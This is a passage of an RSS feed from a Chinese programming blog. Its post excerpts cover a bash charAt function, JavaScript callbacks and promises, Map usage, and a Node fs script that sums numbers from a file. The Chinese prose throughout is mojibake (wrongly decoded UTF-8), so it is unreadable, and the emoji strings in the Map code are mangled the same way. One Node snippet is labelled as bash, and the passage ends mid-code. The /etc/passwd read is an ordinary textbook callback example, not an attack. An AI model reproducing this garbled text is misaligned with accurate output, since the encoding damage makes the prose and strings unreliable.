&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;æŒ‰indexå­˜å–æ•°ç»„ä¸­å­—ç¬¦åœ¨shellä¸­ä¸å¯ç”¨ï¼Œä½†æ˜¯å¯ä»¥ç”¨functionå˜ç›¸å®ç°ï¼š&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;function charAt() {
    string=$1
    i=$2
    echo ${string:i:1}
}
echo $(charAt &amp;#34;Hello&amp;#34; 2) # l
echo $(charAt &amp;#34;Hello&amp;#34; 1) # e
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;äºŒæ•°ç»„å’Œå­—å…¸&#34;&gt;äºŒã€æ•°ç»„å’Œå­—å…¸&lt;/h4&gt;
&lt;p&gt;å®šä¹‰ä¸€ä¸ªæ•°ç»„å¹¶ä¸”éå†å®ƒï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>javascriptsä¸­çš„promise</title>
      <link>https://rendoumi.com/posts/20220524-javascripts_promise/</link>
      <pubDate>Tue, 24 May 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220524-javascripts_promise/</guid>
      <description>&lt;p&gt;&lt;strong&gt;ä¸€ã€åŸºæœ¬æ¦‚å¿µ&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1. å¼‚æ­¥&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;æ‰€è°“ &amp;quot; å¼‚æ­¥ &amp;ldquo;ï¼Œç®€å•è¯´å°±æ˜¯ä¸€ä¸ªä»»åŠ¡åˆ†æˆä¸¤æ®µï¼Œ å…ˆæ‰§è¡Œç¬¬ä¸€æ®µï¼Œ ç„¶åè½¬è€Œæ‰§è¡Œå…¶ä»–ä»»åŠ¡å»ï¼Œ ç­‰åšå¥½äº†å‡†å¤‡ï¼Œ å†å›è¿‡å¤´æ‰§è¡Œç¬¬äºŒæ®µã€‚&lt;/p&gt;
&lt;p&gt;æ¯”å¦‚ï¼Œ æœ‰ä¸€ä¸ªä»»åŠ¡æ˜¯è¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ ä»»åŠ¡çš„ç¬¬ä¸€æ®µæ˜¯å‘æ“ä½œç³»ç»Ÿå‘å‡ºè¯·æ±‚ï¼Œ è¦æ±‚è¯»å–æ–‡ä»¶ã€‚ ç„¶åï¼Œ ç¨‹åºæ‰§è¡Œå…¶ä»–ä»»åŠ¡ï¼Œ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›æ–‡ä»¶ï¼Œå†æ¥ç€æ‰§è¡Œä»»åŠ¡çš„ç¬¬äºŒæ®µï¼ˆ å¤„ç†æ–‡ä»¶ï¼‰ã€‚ è¿™ç§ä¸è¿ç»­çš„æ‰§è¡Œï¼Œ å°±å«åšå¼‚æ­¥ã€‚&lt;/p&gt;
&lt;p&gt;ç›¸åº”åœ°ï¼Œ è¿ç»­çš„æ‰§è¡Œå°±å«åšåŒæ­¥ã€‚ ç”±äºæ˜¯è¿ç»­æ‰§è¡Œï¼Œ ä¸èƒ½æ’å…¥å…¶ä»–ä»»åŠ¡ï¼Œ æ‰€ä»¥æ“ä½œç³»ç»Ÿä»ç¡¬ç›˜è¯»å–æ–‡ä»¶çš„è¿™æ®µæ—¶é—´ï¼Œ ç¨‹åºåªèƒ½å¹²ç­‰ç€ä»€ä¹ˆä¹Ÿåšä¸äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2. å›è°ƒå‡½æ•°&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;javascript è¯­è¨€å¯¹å¼‚æ­¥ç¼–ç¨‹çš„å®ç°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ã€‚ æ‰€è°“å›è°ƒå‡½æ•°ï¼Œ å°±æ˜¯æŠŠä»»åŠ¡çš„ç¬¬äºŒæ®µå•ç‹¬å†™åœ¨ä¸€ä¸ªå‡½æ•°é‡Œé¢ï¼Œ ç­‰åˆ°å‡†å¤‡å¥½äº†ï¼Œç»§ç»­æ‰§è¡Œçš„æ—¶å€™ï¼Œ å°±ç›´æ¥è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚ å®ƒçš„è‹±è¯­åå­— callbackï¼Œ ç›´è¯‘è¿‡æ¥å°±æ˜¯ &amp;quot; å›è°ƒ &amp;ldquo;ã€‚&lt;/p&gt;
&lt;p&gt;è¯»å–æ–‡ä»¶è¿›è¡Œå¤„ç†ï¼Œ æ˜¯è¿™æ ·çš„ï¼Œreadfile æ˜¯å¼‚æ­¥çš„ï¼ŒreadfileSync æ˜¯åŒæ­¥çš„ã€‚&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;fs.readfile(&amp;#39;/etc/passwd&amp;#39;, function(err, data) {
  if(err) throw err;
  console.log(data);
});
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ä¸Šé¢ä»£ç ä¸­ï¼Œ readfile å‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œ å°±æ˜¯å›è°ƒå‡½æ•°ï¼Œ ä¹Ÿå°±æ˜¯ä»»åŠ¡çš„ç¬¬äºŒæ®µã€‚ ç­‰åˆ°æ“ä½œç³»ç»Ÿè¿”å›äº† / etc / passwdè¿™ä¸ªæ–‡ä»¶ä»¥åï¼Œ å›è°ƒå‡½æ•°æ‰ä¼šæ‰§è¡Œã€‚&lt;/p&gt;
&lt;p&gt;==ä¸€ä¸ªæœ‰è¶£çš„é—®é¢˜æ˜¯ï¼Œ ä¸ºä»€ä¹ˆ node.js çº¦å®šï¼Œ å›è°ƒå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ å¿…é¡»æ˜¯é”™è¯¯å¯¹è±¡ errï¼ˆ å¦‚æœæ²¡æœ‰é”™è¯¯ï¼Œ è¯¥å‚æ•°å°±æ˜¯ nullï¼‰ï¼Ÿ åŸå› æ˜¯æ‰§è¡Œåˆ†æˆä¸¤æ®µï¼Œ åœ¨è¿™ä¸¤æ®µä¹‹é—´æŠ›å‡ºçš„é”™è¯¯ï¼Œ ç¨‹åºæ— æ³•æ•æ‰ï¼Œ åªèƒ½å½“ä½œå‚æ•°ï¼Œ ä¼ å…¥ç¬¬äºŒæ®µã€‚==&lt;/p&gt;</description>
    </item>
    <item>
      <title>javascriptsä¸­çš„map</title>
      <link>https://rendoumi.com/posts/20220523-javascripts_map/</link>
      <pubDate>Mon, 23 May 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220523-javascripts_map/</guid>
      <description>&lt;p&gt;Javascripts ä¸­çš„ map&lt;/p&gt;
&lt;p&gt;è¯´åˆ°mapï¼Œå¦‚æœæˆ‘ä»¬æœ‰å¾ªç¯çš„è¯ï¼Œä¸åœéå†ï¼Œä¼šæŠŠæ—¶é—´ææˆ O(n)ã€‚å¦‚æœæœ‰mapï¼Œæ—¶é—´å°±å˜æˆäº†O(1)ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›¸å½“æœ‰æ•ˆç‡çš„ã€‚&lt;/p&gt;
&lt;p&gt;map æ˜¯ ES2015 ä¸­æ–°å¢åŠ çš„ï¼Œæ˜¯ä¸€ç§æ–°çš„ Object ç±»å‹ï¼Œå…è®¸å­˜æ”¾å„ç§ key-value å¯¹ã€‚&lt;/p&gt;
&lt;p&gt;map æœ€å¤§çš„ç‰¹æ€§æ˜¯ï¼Œkey å¯ä»¥æ˜¯ä»»ä½•ç±»å‹ï¼ŒåŒ…æ‹¬ object å’Œ functionï¼›å¯ä»¥è°ƒç”¨ size å¾—åˆ° map çš„å¤§å°ï¼›è¿­ä»£çš„æ—¶å€™ï¼Œæ˜¯ä¸¥æ ¼æŒ‰ç…§æ·»åŠ çš„é¡ºåºè¿›è¡Œè¿­ä»£çš„ã€‚&lt;/p&gt;
&lt;p&gt;map çš„æ–¹æ³•å¦‚ä¸‹ï¼š set, get, size, has, delete, clear:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kd&#34;&gt;let&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;myFunc&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ•&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸš—&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Car&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ &amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;House&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;âœˆï¸&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Airplane&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;myFunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ˜„ Key is a function!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸš—&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// true
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;myFunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// true
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ•&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// false, not the same reference
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;myFunc&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// &amp;#39;ğŸ˜„ Key is a function!&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;delete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;âœˆï¸&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;has&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;âœˆï¸&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// false
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;clear&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 0
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// setting key-value pairs is chainable
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ”§&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Wrench&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ¸&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Guitar&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ğŸ•¹&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Joystick&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;myMap&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Map&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;// Even another map can be a key
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;set&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;myMap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;Oh gosh!&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 4
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;things&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;myMap&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// &amp;#39;Oh gosh!&amp;#39;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿­ä»£å®ƒçš„æ–¹æ³•ï¼Œå¯ä»¥ç”¨ for &amp;hellip; ofï¼Œé¡ºåºæ˜¯ä¸¥æ ¼æŒ‰ç…§ä½ æ’å…¥çš„é¡ºåºæ¥çš„ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>javascriptçš„å®é™…åº”ç”¨-fsæ¨¡å—</title>
      <link>https://rendoumi.com/posts/20220522-javascirpts_fs/</link>
      <pubDate>Sun, 22 May 2022 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20220522-javascirpts_fs/</guid>
      <description>&lt;p&gt;åƒé‡Œä¹‹è¡Œå§‹äºè¶³ä¸‹ï¼Œjavascript æ¨¡å—æ¼«å¤©é£ï¼Œèƒ½åšçš„äº‹ä¹Ÿæ˜¯äº”èŠ±å…«é—¨ã€‚æˆ‘ä»¬æ¥å®è·µä¸€ä¸‹&lt;/p&gt;
&lt;p&gt;å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20220524155511802&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20220522-javascirpts_fs/image-20220524155511802.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;é‡Œé¢æ˜¯ä¸€è¡Œè¡Œæ•°æ®ï¼Œæˆ‘ä»¬è¦åšçš„å°±æ˜¯æŠŠæ‰€æœ‰å€¼å–æ•´æ±‚å’Œï¼Œæ–‡ä»¶ä¸­æœ‰æŸäº›ç©ºè¡Œ&lt;/p&gt;
&lt;p&gt;å¾ˆç®€å•ï¼Œç¨‹åºå¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;var &lt;span class=&#34;nv&#34;&gt;fs&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; require&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;fs&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;calculate&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    fs.readFile&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;data.txt&amp;#39;&lt;/span&gt;, &lt;span class=&#34;s1&#34;&gt;&amp;#39;utf8&amp;#39;&lt;/span&gt;, &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err, data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            throw new Error&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;err&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        const &lt;span class=&#34;nv&#34;&gt;arr&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; data.split&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;\r\n&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        const &lt;span class=&#34;nv&#34;&gt;result&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; arr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .filter&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;e&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&amp;gt; e&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            .map&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;parseFloat&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
